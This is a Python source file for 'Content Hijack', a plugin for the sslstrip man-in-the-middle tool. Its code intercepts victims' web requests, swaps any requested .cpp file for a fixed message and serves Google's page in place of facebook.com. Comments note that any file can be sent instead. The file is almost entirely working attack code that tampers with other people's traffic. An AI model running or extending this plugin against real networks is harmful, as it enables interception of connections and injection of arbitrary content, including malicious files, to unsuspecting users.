"""s1plugin is a extension for Moxie Marlinspike's sslstrip."""
 
__author__ = "SizeOne"
__email__  = ""
__license__= """
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

http://sizeonedev.wordpress.com/

"""
from s1plugin.S1DummyPlugin import S1DummyPlugin
import urllib

class S1Plugin(S1DummyPlugin):
	def __init__(self):
		self.name = "Content Hijack"
		self.author = "SizeOne"
		self.version = "1.0"
		self.s1version = ["1.0"] #only works for s1plugin ver 1.0
		self.url = "http://sizeone.net"
		self.help = "This plugin hijacks a connection and sends what it wants instead."
	
	#replace any connection you want!
	def hijackConnection(self,client,url,clientConnection):
		try:
			url.lower().index(".cpp")
			#Ok lets replace this .cpp file for a message
			clientConnection.setResponseCode(200, "OK")
			clientConnection.setHeader("Content-type", "text/plain")
			clientConnection.write("Sorry... couldn't load your cpp file :|") #open and send any file you want
			clientConnection.finish()
			#stop other plugins and ssl strip from doing anything here
			return True
		except ValueError:
			#pass along we don't want to stop this
			pass
		#let's play every time he tries to open facebook he will get the google plus page
		#there are other ways to do this, on another methods changing the host more efficient
		#probably the page will show up with some errors, this is more indicated for files
		try:
			url.lower().index("facebook.com")
			#Ok lets replace this .cpp file for a message
			clientConnection.setResponseCode(200, "OK")
			clientConnection.setHeader("Content-type", "text/html")
			f = urllib.urlopen("http://google.com") # :)
			clientConnection.write(f.read()) #BAD you shouldn't do it like this if you want performance
			#by doing like this first the file is fully downloaded and then passed to client
			#you need to separate download into pieces and threads blablabla :)
			clientConnection.finish()
			#stop other plugins and ssl strip from doing anything here
			return True
		except ValueError:
			#pass along we don't want to stop this
			pass
		return False